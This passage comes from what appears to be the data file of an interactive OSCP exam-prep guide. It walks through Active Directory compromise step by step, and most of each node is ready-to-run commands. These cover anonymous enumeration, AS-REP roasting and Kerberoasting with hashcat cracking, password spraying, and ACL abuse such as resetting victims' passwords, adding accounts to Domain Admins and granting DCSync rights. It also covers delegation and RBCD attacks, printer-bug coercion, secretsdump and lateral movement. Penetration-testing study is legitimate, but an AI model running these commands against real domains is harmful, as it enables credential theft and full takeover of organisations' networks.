# ✅ whoami showing SYSTEM or Administrator
# ✅ hostname visible
# ✅ ipconfig showing target IP
# ✅ type proof.txt showing hash
# ✅ All in ONE screenshot`,
    warn: null,
    choices: [
      { label: "New subnet in route print — pivot!", next: "pivot_start" },
      { label: "Back to start — next machine", next: "start" },
    ],
  },

  // ══════════════════════════════════════════
  //  ACTIVE DIRECTORY
  // ══════════════════════════════════════════
  ad_nocreds: {
    phase: "AD",
    title: "AD — No Creds Yet: Identify and Enumerate",
    body: "You identified AD from the scan — ports 88 (Kerberos), 389 (LDAP), 445, 464, 3268 are the signature. Before you have any credentials the goal is: extract usernames, find null/anonymous access, hunt description fields for passwords, check SYSVOL/NETLOGON, and build a username list for kerbrute. Everything here is zero-auth or anonymous — no lockout risk. Add the domain and DC to /etc/hosts immediately. This is the S1REN first move: orient, then enumerate before touching anything authenticated.",
    cmd: `# ── STEP 0: ORIENT — do this first ───────
# Confirm it's AD (look for these in nmap output)
# 88/tcp  open  kerberos-sec
# 389/tcp open  ldap        → "Domain: domain.local"
# 3268/tcp open ldap         → Global Catalog
# 445/tcp open  microsoft-ds

# Extract domain name from nmap output:
# "LDAP (Domain: corp.local0., Site: Default-First-Site-Name)"
# Strip trailing 0. → corp.local

export DOMAIN=corp.local
export DC_IP=$ip
# Add to /etc/hosts — mandatory, Kerberos needs name resolution
echo "$DC_IP dc01.$DOMAIN $DOMAIN" >> /etc/hosts

# ── STEP 1: SMB NULL / GUEST SESSION ─────
# Try before anything else — often gives you users, shares, policy
crackmapexec smb $DC_IP -u '' -p ''
crackmapexec smb $DC_IP -u 'guest' -p ''
# If [+] — you have anonymous/guest access
# Enumerate what you can get:
crackmapexec smb $DC_IP -u '' -p '' --shares
crackmapexec smb $DC_IP -u '' -p '' --users
crackmapexec smb $DC_IP -u '' -p '' --pass-pol

# enum4linux-ng — full null session dump
enum4linux-ng -A $DC_IP
# Look for: users, groups, password policy, shares, OS info
# Pipe to file — output is long:
enum4linux-ng -A $DC_IP | tee enum4linux_out.txt

# ── STEP 2: LDAP ANONYMOUS ───────────────
# LDAP often allows anonymous binds — yields full user/group lists
ldapsearch -x -H ldap://$DC_IP -b "dc=$(echo $DOMAIN | sed 's/\./,dc=/g')" -s sub "(objectClass=user)" sAMAccountName description memberOf 2>/dev/null | grep -E "sAMAccountName:|description:|memberOf:"

# Full anonymous dump:
ldapsearch -x -H ldap://$DC_IP -b "dc=$(echo $DOMAIN | sed 's/\./,dc=/g')" > ldap_anon.txt
# Hunt for passwords in description fields:
grep -i "description:" ldap_anon.txt | grep -iv "built-in\|default"

# ── STEP 3: RID BRUTE — enumerate users ──
# Works when null sessions are restricted — brute forces RIDs
# Low noise, no lockout risk
crackmapexec smb $DC_IP -u '' -p '' --rid-brute
crackmapexec smb $DC_IP -u 'guest' -p '' --rid-brute
# impacket — same technique:
impacket-lookupsid $DOMAIN/guest@$DC_IP -no-pass 2>/dev/null | grep "SidTypeUser" | awk -F'\\ ' '{print $2}' | awk '{print $1}' > users.txt

# ── STEP 4: KERBRUTE — valid username enum ─
# Uses AS-REQ probes — no authentication, no lockout
# Requires a username wordlist (SecLists or built from OSINT)
./kerbrute_linux_amd64 userenum \
  -d $DOMAIN --dc $DC_IP \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -o kerbrute_valid.txt --downcase
# --downcase normalises to lowercase — AD names are case-insensitive

# Faster — just common names wordlist first:
./kerbrute_linux_amd64 userenum \
  -d $DOMAIN --dc $DC_IP \
  /usr/share/seclists/Usernames/Names/names.txt \
  -o kerbrute_valid.txt

# ── STEP 5: SYSVOL / NETLOGON HUNTING ────
# SYSVOL is world-readable — always check
smbclient //$DC_IP/SYSVOL -U '' -N
smbclient //$DC_IP/SYSVOL -N -c "ls"
# Spider it recursively for scripts, configs, Group Policy:
crackmapexec smb $DC_IP -u '' -p '' -M spider_plus
# Look for: Groups.xml (GPP passwords), scripts with hardcoded creds
# Groups.xml → decrypt cpassword:
gpp-decrypt 'CPASSWORD_VALUE_HERE'

# Manually grab Groups.xml if found:
smbclient //$DC_IP/SYSVOL -N -c "get Policies/{GUID}/Machine/Preferences/Groups/Groups.xml"

# ── STEP 6: DESCRIPTION FIELD SWEEP ──────
# Passwords in description fields is one of the most common
# AD misconfigurations — check every time
crackmapexec smb $DC_IP -u '' -p '' --users 2>/dev/null | grep -i "badpwdcount\|description"
ldapsearch -x -H ldap://$DC_IP -b "dc=$(echo $DOMAIN | sed 's/\./,dc=/g')" "(objectClass=user)" description | grep -i "description:" | grep -v "^#"

# ── STEP 7: AS-REP ROAST — no creds needed ─
# If you have a username list — try without authentication
impacket-GetNPUsers $DOMAIN/ \
  -usersfile users.txt \
  -dc-ip $DC_IP \
  -request -outputfile asrep_noauth.kerb -no-pass
# Any result → hash to crack offline`,
    warn: "The description field is the most commonly overlooked no-creds finding — check it on every AD box. SYSVOL is world-readable by default and GPP passwords (Groups.xml) are still found on real exams. RID bruting with crackmapexec almost always works even when null sessions appear blocked — try it before moving on. Kerbrute uses AS-REQ probes not authentication — zero lockout risk, but it does generate Kerberos traffic.",
    choices: [
      { label: "Got null/guest session — users and shares found", next: "ad_start" },
      { label: "Description field had a password", next: "ad_start" },
      { label: "GPP password found in SYSVOL", next: "ad_start" },
      { label: "AS-REP roast hit — no creds needed", next: "asrep_roast" },
      { label: "Have username list — try AS-REP roast", next: "asrep_roast" },
      { label: "Nothing anonymous — given creds (assumed breach)", next: "ad_start" },
    ],
  },

  ad_start: {
    phase: "AD",
    title: "Active Directory — Enumeration with Creds",
    body: "OSCP AD sets give you low-priv domain creds and a foothold. The first 15 minutes are critical: verify your creds work, map the domain structure, check the password policy before touching anything noisy. BloodHound runs in the background while you do manual enumeration. Everything in AD is about finding a path from your current account to Domain Admin — BloodHound shows you paths, manual enum finds what BloodHound misses.",
    cmd: `# ── STEP 0: ORIENT ───────────────────────
# Add DC to /etc/hosts (replace with real values)
echo "$ip dc01.domain.local domain.local" >> /etc/hosts
export DOMAIN=domain.local
export DC_IP=$ip
export USER=lowprivuser
export PASS='Password123!'

# ── STEP 1: VERIFY CREDS + CONNECTIVITY ──
crackmapexec smb $DC_IP -u $USER -p $PASS
# Should show: [+] domain.local\lowprivuser:Password123! (Pwn3d! = local admin)

# Test WinRM (if WinRM open — gives shell directly):
crackmapexec winrm $DC_IP -u $USER -p $PASS
evil-winrm -i $DC_IP -u $USER -p $PASS

# ── STEP 2: PASSWORD POLICY — READ THIS FIRST ──
crackmapexec smb $DC_IP -u $USER -p $PASS --pass-pol
# Note: Lockout threshold (0 = no lockout = spray freely)
# Note: Observation window (reset counter after N minutes)
# Note: Min password length, complexity

# ── STEP 3: USER + GROUP ENUM ─────────────
crackmapexec smb $DC_IP -u $USER -p $PASS --users   # all domain users + badpwdcount
crackmapexec smb $DC_IP -u $USER -p $PASS --groups  # group membership
crackmapexec smb $DC_IP -u $USER -p $PASS --shares  # readable shares

# impacket enum (often gets more detail)
impacket-GetADUsers -all $DOMAIN/$USER:'$PASS' -dc-ip $DC_IP

# LDAP enum — full user dump
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \\
  -b "dc=$(echo $DOMAIN | sed 's/\./,dc=/g')" \\
  "(objectClass=user)" sAMAccountName memberOf description \\
  | grep -E "sAMAccountName:|memberOf:|description:"

# ── STEP 4: COMPUTER ENUM ────────────────
crackmapexec smb $DC_IP -u $USER -p $PASS --computers
# Note all computer names — non-DC machines are privesc paths

# ── STEP 5: SMB SHARE HUNTING ─────────────
# Spider readable shares for creds, configs, scripts
crackmapexec smb $DC_IP -u $USER -p $PASS -M spider_plus -o READ_ONLY=false
# Or manually:
smbclient -L //$DC_IP -U $DOMAIN/$USER%$PASS
smbclient //$DC_IP/SHARENAME -U $DOMAIN/$USER%$PASS
# Look for: .xml, .txt, .ps1, .bat, .config, web.config, Groups.xml (GPP creds)

# ── STEP 6: GPP PASSWORD (Groups.xml) ────
# Old GPP passwords stored in SYSVOL — still works on unpatched DCs
crackmapexec smb $DC_IP -u $USER -p $PASS -M gpp_password
crackmapexec smb $DC_IP -u $USER -p $PASS -M gpp_autologin
# Or manually:
smbclient //$DC_IP/SYSVOL -U $DOMAIN/$USER%$PASS
# find Groups.xml → decrypt cpassword:
gpp-decrypt 'CPASSWORD_VALUE'

# ── STEP 7: BLOODHOUND COLLECTION ─────────
# CME one-liner — collects everything and zips for BloodHound import:
crackmapexec smb $DC_IP -u $USER -p $PASS --bloodhound -ns $DC_IP --collection All
# Output: *.zip in current dir → drag into BloodHound UI

# If DNS fails (common when DC IP ≠ DNS server):
crackmapexec smb $DC_IP -u $USER -p $PASS --bloodhound -ns $DC_IP --dns-tcp --collection All
# --dns-tcp forces TCP for DNS resolution (more reliable than UDP on VPN/tunnels)

# Standalone bloodhound-python:
bloodhound-python -u $USER -p "$PASS" -d $DOMAIN -ns $DC_IP -c All
bloodhound-python -u $USER -p "$PASS" -d $DOMAIN -ns $DC_IP -c All --dns-tcp

# From Windows foothold (SharpHound):
.\\SharpHound.exe -c All --zipfilename bh_data.zip
# Transfer zip to Kali, import into BloodHound`,
    warn: "Password policy is non-negotiable to check first. A lockout threshold of 3 with a 30-minute window means you get 2 spray attempts per window. Get it wrong and you lock accounts — exam failure. If lockout threshold shows 0 (no lockout), spray freely. --dns-tcp is critical when running over a VPN or tunnel — UDP DNS often fails silently and BloodHound collection returns empty results without any error message.",
    choices: [
      { label: "Run BloodHound (mandatory)", next: "bloodhound" },
      { label: "Responder — passive NTLM hash capture", next: "responder" },
      { label: "Found GPP/share creds — test them", next: "creds_found" },
      { label: "AS-REP Roast (no pre-auth accounts)", next: "asrep_roast" },
      { label: "Kerberoast (SPN accounts)", next: "kerberoast" },
      { label: "Password spray (policy checked — safe)", next: "ad_spray" },
    ],
  },

  bloodhound: {
    phase: "AD",
    title: "BloodHound",
    body: "BloodHound is mandatory. Run collection immediately and let it process while you do manual enum. The graph shows you attack paths that would take hours to find manually. The key is knowing which queries to run and how to read the output — a path is only useful if you understand each edge and what it requires you to do.",
    cmd: `# ── COLLECTION — from Kali (no upload needed) ──
# bloodhound-python — best default, works remotely
bloodhound-python -u $USER -p '$PASS' \\
  -d $DOMAIN -ns $DC_IP -c All --zip
# Produces: YYYYMMDDHHMMSS_BloodHound.zip

# DNS issues? Add --dns-tcp or use NS directly:
bloodhound-python -u $USER -p '$PASS' \\
  -d $DOMAIN -ns $DC_IP -c All --dns-tcp --zip

# ── COLLECTION — from Windows target (SharpHound) ──
iwr http://$LHOST/SharpHound.exe -OutFile C:\\Windows\\Temp\\sh.exe
C:\\Windows\\Temp\\sh.exe -c All --zipfilename bh_out.zip
# Exfil the zip: download via evil-winrm or SMB

# ── START BLOODHOUND ───────────────────────
sudo neo4j start       # wait ~10s for DB to come up
bloodhound             # open GUI, login neo4j/neo4j (change on first run)
# Import: drag zip into BloodHound window

# ── QUERIES — RUN IN THIS ORDER ───────────
# 1. SHORTEST PATHS TO DOMAIN ADMINS
#    Analysis tab → "Shortest Paths to Domain Admins from Owned Principals"
#    (right-click your user node → Mark as Owned first)

# 2. FIND ALL KERBEROASTABLE USERS
#    Analysis → "Find all Kerberoastable Users"
#    Look for high-value targets (adminCount=1 = was/is privileged)

# 3. FIND AS-REP ROASTABLE USERS
#    Analysis → "Find AS-REP Roastable Users (DontReqPreAuth)"

# 4. FIND PRINCIPALS WITH DCSYNC RIGHTS
#    Analysis → "Find Principals with DCSync Rights"
#    Anyone here can dump the entire domain

# 5. COMPUTERS WHERE DOMAIN USERS CAN RDP / LOCAL ADMIN
#    Analysis → "Find Computers where Domain Users are Local Admins"
#    Analysis → "Find Computers where Domain Users can RDP"

# 6. OWNED PRINCIPAL PATHS (after marking accounts owned)
#    Right-click any compromised user → Mark as Owned
#    Analysis → "Shortest Paths from Owned Principals to Domain Admins"

# ── READING EDGES ─────────────────────────
# GenericAll       → full control: reset password, add to group, write ACL
# GenericWrite     → write specific attributes: set SPN for Kerberoast, set logon script
# WriteDACL        → grant yourself any right including DCSync
# WriteOwner       → take ownership → then WriteDACL → DCSync
# ForceChangePassword → reset without knowing current password
# AllowedToDelegate → constrained delegation abuse (S4U)
# AllowedToAct     → resource-based constrained delegation

# Custom Cypher queries (paste into Raw Query box):
# All users with description field (creds often here):
MATCH (u:User) WHERE u.description IS NOT NULL RETURN u.name,u.description
# All computers with unconstrained delegation:
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
# Path from current user to DA:
MATCH p=shortestPath((u:User {name:"YOURUSER@DOMAIN.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p`,
    warn: "Mark every account you compromise as Owned immediately — BloodHound's 'Shortest Path from Owned' query is useless without this. Read every edge on a path before acting — some edges require specific conditions (target must be logged in, specific service running). GenericWrite → SPN attack requires the target account doesn't already have an SPN.",
    choices: [
      { label: "Kerberoastable accounts found", next: "kerberoast" },
      { label: "AS-REP Roastable accounts found", next: "asrep_roast" },
      { label: "ACL abuse path found (GenericAll/WriteDACL)", next: "acl_abuse" },
      { label: "Delegation abuse path found", next: "delegation" },
      { label: "AD CS vulnerable templates", next: "adcs" },
      { label: "Unconstrained delegation computer found", next: "delegation" },
      { label: "No path — manual enum + spray", next: "ad_spray" },
    ],
  },

  asrep_roast: {
    phase: "AD",
    title: "AS-REP Roasting",
    body: "When a user account has 'Do not require Kerberos preauthentication' enabled, anyone can request an AS-REP from the DC for that account without knowing the password. The response contains a blob encrypted with the user's hash — crack it offline. Zero noise beyond a normal AS-REQ. Can be done unauthenticated if you have a username list. Always run this before spraying.",
    cmd: `# ── WITH CREDS — enumerate and roast ─────
# More reliable — DC will return hashes for all vulnerable accounts
impacket-GetNPUsers $DOMAIN/$USER:'$PASS' \\
  -dc-ip $DC_IP -request -outputfile asrep.kerb
# If any accounts returned: they appear as $krb5asrep$23$...

# ── WITHOUT CREDS — username list required ─
# Need usernames first (kerbrute, CME, LDAP, OSINT)
impacket-GetNPUsers $DOMAIN/ \\
  -usersfile users.txt -dc-ip $DC_IP \\
  -request -outputfile asrep_noauth.kerb -no-pass
# users.txt: one sAMAccountName per line (no @domain)

# ── BUILD USERNAME LIST (if you don't have one) ──
# Kerbrute — valid username enum (no lockout risk — uses AS-REQ probes)
./kerbrute_linux_amd64 userenum \\
  -d $DOMAIN --dc $DC_IP \\
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \\
  -o valid_users.txt

# From CME (needs creds):
crackmapexec smb $DC_IP -u $USER -p '$PASS' --users \\
  | grep -oP '(?<=\[\+\] )[^:]+:\w+' | awk '{print $2}' > users.txt

# ── FROM WINDOWS (Rubeus) ─────────────────
# All accounts with pre-auth disabled:
.\\Rubeus.exe asreproast /outfile:asrep.txt /format:hashcat
# Target specific user:
.\\Rubeus.exe asreproast /user:targetuser /format:hashcat /outfile:asrep.txt

# ── CRACK ─────────────────────────────────
# Type 18200 = AS-REP etype 23 (RC4)
hashcat -m 18200 asrep.kerb /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.kerb /usr/share/wordlists/rockyou.txt \\
  -r /usr/share/hashcat/rules/best64.rule
hashcat -m 18200 asrep.kerb /usr/share/wordlists/rockyou.txt \\
  -r /usr/share/hashcat/rules/d3ad0ne.rule

# John fallback:
john asrep.kerb --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep

# ── USE CRACKED CREDS ─────────────────────
crackmapexec smb $DC_IP -u cracked_user -p 'CrackedPass!'
crackmapexec winrm $DC_IP -u cracked_user -p 'CrackedPass!'
evil-winrm -i $DC_IP -u cracked_user -p 'CrackedPass!'
# Re-run BloodHound marked as Owned — new paths may open`,
    warn: "No pre-auth accounts doesn't mean it's not worth checking — misconfigured accounts get created and forgotten. If you crack an AS-REP hash and the account has no special rights, still mark it as Owned in BloodHound and re-run path queries — it may have ACL rights or group memberships that open new paths. Kerbrute username enum generates AS-REQ traffic (not AS-REP) — it does not trigger lockouts.",
    choices: [
      { label: "Cracked — got new account creds", next: "creds_found" },
      { label: "New account — re-run BloodHound paths", next: "bloodhound" },
      { label: "Account has ACL rights — abuse them", next: "acl_abuse" },
      { label: "No vulnerable accounts — Kerberoast", next: "kerberoast" },
      { label: "No luck cracking — spray instead", next: "ad_spray" },
    ],
  },

  kerberoast: {
    phase: "AD",
    title: "Kerberoasting",
    body: "Any authenticated domain user can request a TGS for any SPN-enabled account. The ticket is encrypted with the service account's password hash — crack it offline, no noise on the DC beyond a normal Kerberos TGS-REQ. High-value targets are service accounts with adminCount=1 (was once privileged). Prioritize those over generic service accounts.",
    cmd: `# ── STEP 1: ENUMERATE SPNS ───────────────
# From Kali — list SPNs without requesting tickets yet
impacket-GetUserSPNs $DOMAIN/$USER:'$PASS' -dc-ip $DC_IP

# Look for:
#   adminCount=1 → account was/is in privileged group → higher value target
#   Service type in SPN (MSSQLSvc, HTTP, HOST) → hints at what service account controls
#   Custom SPNs (not standard OS) → likely service account with a real password

# ── STEP 2: REQUEST + DUMP TICKETS ───────
# Kali (impacket):
impacket-GetUserSPNs $DOMAIN/$USER:'$PASS' \\
  -dc-ip $DC_IP -request -outputfile tgs.txt

# Windows (Rubeus — more stealth options):
.\\Rubeus.exe kerberoast /outfile:tgs.txt
# Target specific account only (less noise):
.\\Rubeus.exe kerberoast /user:svc_mssql /outfile:tgs_targeted.txt
# RC4 downgrade (easier to crack — requests RC4 even if AES configured):
.\\Rubeus.exe kerberoast /tgtdeleg /outfile:tgs_rc4.txt

# Windows (PowerView):
Get-NetUser -SPN | select samaccountname,serviceprincipalname
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File tgs.txt -Encoding ASCII

# ── STEP 3: CRACK ─────────────────────────
# RC4 hashes (type 13100) — most common, faster to crack
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule

# AES-256 hashes (type 19700) — if RC4 not available
hashcat -m 19700 tgs.txt /usr/share/wordlists/rockyou.txt

# John fallback:
john tgs.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs

# ── STEP 4: USE CRACKED CREDS ─────────────
# Verify cracked creds:
crackmapexec smb $DC_IP -u svc_mssql -p 'CrackedPass!'
# Check if service account has local admin anywhere:
crackmapexec smb $DC_IP -u svc_mssql -p 'CrackedPass!' --local-auth
# WinRM:
evil-winrm -i $DC_IP -u svc_mssql -p 'CrackedPass!'`,
    warn: "Prioritize SPNs where adminCount=1 — these accounts were previously in privileged groups and often still have residual high-value permissions. If hashes won't crack with rockyou + best64, try a targeted wordlist built from the domain: username variations, company name, season+year combos. RC4 downgrade (Rubeus /tgtdeleg) significantly speeds up cracking.",
    choices: [
      { label: "Cracked — got service account creds", next: "creds_found" },
      { label: "Service account has local admin — lateral move", next: "lateral_movement" },
      { label: "Cracked — service account has DCSync rights", next: "dcsync" },
      { label: "No luck cracking — try ACL abuse path", next: "acl_abuse" },
      { label: "Check BloodHound with new account", next: "bloodhound" },
    ],
  },

  ad_spray: {
    phase: "AD",
    title: "Password Spraying",
    body: "One password across all users. Seasonal passwords, company name variants, default creds. One attempt per account per window to avoid lockout.",
    cmd: `# CHECK POLICY FIRST
crackmapexec smb $ip -u user -p 'pass' --pass-pol

# Spray with CME
crackmapexec smb $ip -u users.txt -p 'Password123!' --continue-on-success
crackmapexec smb $ip -u users.txt -p 'Winter2024!' --continue-on-success

# Kerbrute spray (faster, less noisy)
./kerbrute_linux_amd64 passwordspray \\
  -d domain.com --dc $ip \\
  users.txt 'Password123!'

# Common spray passwords:
# Password1!   Welcome1!   Summer2024!
# Winter2025!  Company123! <CompanyName>1!`,
    warn: "One spray attempt per lockout window. Locking accounts = exam failure.",
    choices: [
      { label: "Spray hit — got new creds", next: "creds_found" },
      { label: "Nothing — AS-REP roast or Kerberoast", next: "asrep_roast" },
    ],
  },

  acl_abuse: {
    phase: "AD",
    title: "ACL Abuse — Misconfigured Permissions",
    body: "BloodHound found an ACL edge. Each edge type has a specific exploitation method — don't mix them up. The key questions are: what object do you have rights over (user, group, computer, domain), and what right do you have (GenericAll, GenericWrite, WriteDACL, ForceChangePassword, WriteOwner). Read the BloodHound edge tooltip before acting — it tells you exactly what the edge allows. PowerView is your tool for all of these from a Windows foothold.",
    cmd: `# ── SETUP: POWERVIEW ─────────────────────
# Load PowerView (after AMSI bypass if needed):
iwr http://$LHOST/PowerView.ps1 -OutFile C:\Windows\Temp\pv.ps1
. C:\Windows\Temp\pv.ps1
# Or from Kali via evil-winrm: upload PowerView.ps1

# ── GENERICALL OVER A USER ────────────────
# Full control — force password reset (no knowledge of old password needed)
$pass = ConvertTo-SecureString 'Pwn3d!123' -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $pass
# Then authenticate as targetuser:
evil-winrm -i $ip -u targetuser -p 'Pwn3d!123'

# Or: set a SPN on the account → Kerberoast it
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}
impacket-GetUserSPNs $DOMAIN/$USER:'$PASS' -dc-ip $DC_IP -request -outputfile tgs.txt

# ── GENERICALL OVER A GROUP ───────────────
# Add yourself directly to the group (e.g., Domain Admins)
Add-DomainGroupMember -Identity 'Domain Admins' -Members $USER
# Verify:
Get-DomainGroupMember 'Domain Admins' | select MemberName

# ── GENERICALL OVER A COMPUTER ────────────
# Resource-Based Constrained Delegation (RBCD) attack:
# 1. Create a fake computer account you control
impacket-addcomputer $DOMAIN/$USER:'$PASS' -computer-name 'FAKE$' -computer-pass 'FakePass123!' -dc-ip $DC_IP
# 2. Set msDS-AllowedToActOnBehalfOfOtherIdentity on the target
Set-DomainRBCD -Identity TARGET_COMPUTER -DelegateFrom FAKE$ -Verbose
# 3. Get a ticket impersonating administrator
impacket-getST $DOMAIN/FAKE$:'FakePass123!' -spn cifs/TARGET.domain.com -impersonate administrator -dc-ip $DC_IP
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass administrator@TARGET.domain.com

# ── GENERICWRITE OVER A USER ──────────────
# Cannot reset password — can write specific attributes
# Option 1: Set SPN → Kerberoast
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}
impacket-GetUserSPNs $DOMAIN/$USER:'$PASS' -dc-ip $DC_IP -request -outputfile tgs.txt

# Option 2: Set logon script → code execution when user logs in
Set-DomainObject -Identity targetuser -Set @{scriptpath='\\$LHOST\share\shell.bat'}

# ── WRITEDACL OVER DOMAIN/OBJECT ──────────
# Grant yourself DCSync rights over the domain
Add-DomainObjectAcl \\
  -TargetIdentity "DC=$DOMAIN_DC,DC=$DOMAIN_TLD" \\
  -PrincipalIdentity $USER \\
  -Rights DCSync -Verbose
# Then run DCSync from Kali:
impacket-secretsdump $DOMAIN/$USER:'$PASS'@$DC_IP -just-dc-ntlm

# ── WRITEOWNER ────────────────────────────
# Take ownership of object → then grant yourself GenericAll
Set-DomainObjectOwner -Identity targetuser -OwnerIdentity $USER
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity $USER -Rights All

# ── FORCECHANGEPASSWORD ───────────────────
# Reset target's password without knowing current password
$pass = ConvertTo-SecureString 'NewPass!123' -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $pass
# From Kali (no Windows needed):
impacket-rpcclient $DOMAIN/$USER:'$PASS'@$DC_IP
rpcclient> setuserinfo2 targetuser 23 'NewPass!123'

# ── FROM KALI (impacket — no Windows needed) ──
# GenericAll/ForceChangePassword via rpcclient:
impacket-rpcclient -U "$DOMAIN/$USER%$PASS" $DC_IP -c "setuserinfo2 targetuser 23 'NewPass!123'"

# WriteDACL via impacket:
impacket-dacledit -action write -rights DCSync \\
  -principal $USER \\
  -target-dn "DC=$DOMAIN_DC,DC=$DOMAIN_TLD" \\
  "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP`,
    warn: "Always verify your ACL edge in BloodHound before acting — GenericAll on a group vs GenericAll on a user are completely different exploits. From Kali, impacket-dacledit and impacket-rpcclient handle most ACL abuses without needing a Windows foothold. After adding yourself to Domain Admins, wait 5-10 minutes for replication or re-authenticate to get the updated token — your current session won't reflect the group change immediately.",
    choices: [
      { label: "Added to Domain Admins — lateral move to DC", next: "lateral_movement" },
      { label: "WriteDACL — granted DCSync rights", next: "dcsync" },
      { label: "Password reset on high-value user", next: "creds_found" },
      { label: "Kerberoasted via GenericWrite SPN", next: "kerberoast" },
      { label: "RBCD attack on computer — got SYSTEM", next: "lateral_movement" },
    ],
  },

  delegation: {
    phase: "AD",
    title: "Delegation Attacks",
    body: "Delegation lets services act on behalf of users. Two types with completely different attack paths. Unconstrained: the machine stores full TGTs — if you compromise it, you steal tickets for any user who authenticates to it, including Domain Admins. Constrained: the account can impersonate any user to a specific service — exploited via S4U2Self/S4U2Proxy to get a ticket as Administrator. Resource-Based Constrained Delegation (RBCD) is the modern variant, triggered by GenericAll/GenericWrite over a computer object.",
    cmd: `# ── FIND DELEGATION TARGETS ──────────────
# Unconstrained delegation computers (highest value):
Get-DomainComputer -Unconstrained | select name,dnshostname
# Any computer here (excluding DCs) = attack target
# If you compromise it → steal TGTs of any DA that connects

# Unconstrained delegation users:
Get-DomainUser -AllowDelegation -AdminCount | select samaccountname

# Constrained delegation (specific SPNs):
Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto

# From Kali:
impacket-findDelegation $DOMAIN/$USER:'$PASS' -dc-ip $DC_IP

# ── UNCONSTRAINED DELEGATION ATTACK ──────
# Prerequisite: you have SYSTEM on the unconstrained delegation machine
# Step 1: Monitor for TGTs hitting this machine
.\Rubeus.exe monitor /interval:5 /nowrap
# Step 2: Trigger a DA to connect (e.g., printer bug / SpoolSample)
.\SpoolSample.exe $DC_FQDN $UNCONSTRAINED_HOST_FQDN
# Step 3: Rubeus captures the TGT — base64 blob appears in monitor output
# Step 4: Import the ticket
.\Rubeus.exe ptt /ticket:BASE64_BLOB
# Step 5: Verify + use
.\Rubeus.exe klist
dir \\$DC_FQDN\C$    # test DA access

# ── CONSTRAINED DELEGATION — S4U ATTACK ──
# You control an account with constrained delegation configured
# Impersonate Administrator to the allowed service

# From Windows (Rubeus):
.\Rubeus.exe s4u \\
  /user:svc_delegated \\
  /rc4:$NTLM_HASH \\
  /impersonateuser:administrator \\
  /msdsspn:"CIFS/dc01.$DOMAIN" \\
  /ptt
# Verify:
.\Rubeus.exe klist
dir \\dc01.$DOMAIN\C$

# From Kali (impacket):
impacket-getST \\
  -spn CIFS/dc01.$DOMAIN \\
  -impersonate administrator \\
  $DOMAIN/svc_delegated -hashes :$NTLM_HASH -dc-ip $DC_IP
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass administrator@dc01.$DOMAIN

# ── RBCD — RESOURCE-BASED CONSTRAINED DELEGATION ──
# Prerequisite: GenericAll or GenericWrite over a computer object
# (BloodHound will show this edge)

# Step 1: Create a fake computer account you control
impacket-addcomputer $DOMAIN/$USER:'$PASS' \\
  -computer-name 'ATTACKER$' \\
  -computer-pass 'AttackerPass123!' \\
  -dc-ip $DC_IP

# Step 2: Set msDS-AllowedToActOnBehalfOfOtherIdentity on target
# (from Windows with PowerView):
$SD = New-Object Security.AccessControl.RawSecurityDescriptor \\
  -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-XXXX-YYYY-ZZZZ-ATTACKER_RID)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainRawObject TARGET_COMPUTER \\
  -Properties @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Or from Kali (impacket-rbcd):
impacket-rbcd -action write \\
  -delegate-from 'ATTACKER$' \\
  -delegate-to 'TARGET_COMPUTER$' \\
  $DOMAIN/$USER:'$PASS' -dc-ip $DC_IP

# Step 3: Get ST impersonating administrator
impacket-getST \\
  -spn cifs/TARGET.$DOMAIN \\
  -impersonate administrator \\
  $DOMAIN/'ATTACKER$':'AttackerPass123!' -dc-ip $DC_IP
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass administrator@TARGET.$DOMAIN`,
    warn: "Unconstrained delegation requires you to actually compromise the machine first — it's not a remote attack. The printer bug (SpoolSample) forces a DC to authenticate to your compromised machine, capturing the DC machine account TGT. With that you can perform a DCSync equivalent. RBCD is the most reliable constrained delegation attack from Kali since it only needs impacket and a writable computer object — no Windows foothold required.",
    choices: [
      { label: "Unconstrained — captured DA TGT", next: "dcsync" },
      { label: "Constrained S4U — ticket as administrator", next: "lateral_movement" },
      { label: "RBCD — secretsdump on target", next: "dcsync" },
    ],
  },

  lateral_movement: {
    phase: "AD",
    title: "Lateral Movement — Move Between Machines",
    body: "You have credentials, a hash, or a ticket — now move. Tool choice depends on what ports are open and what rights you have. evil-winrm is the cleanest for WinRM (5985). psexec gives a SYSTEM shell but writes a service — noisier. wmiexec is stealthier (no service, no disk write). Always verify creds with CME before attempting a connection — it saves time. Pass-the-hash works with NTLM; pass-the-ticket works with Kerberos.",
    cmd: `# ── STEP 0: VERIFY CREDS FIRST ───────────
# Know what you're getting before connecting
crackmapexec smb $TARGET -u $USER -p '$PASS'
crackmapexec smb $TARGET -u $USER -H $NTLM_HASH
# [+] = valid creds    (Pwn3d!) = local admin → can get shell

crackmapexec winrm $TARGET -u $USER -p '$PASS'
# [+] = WinRM open and creds valid → evil-winrm will work

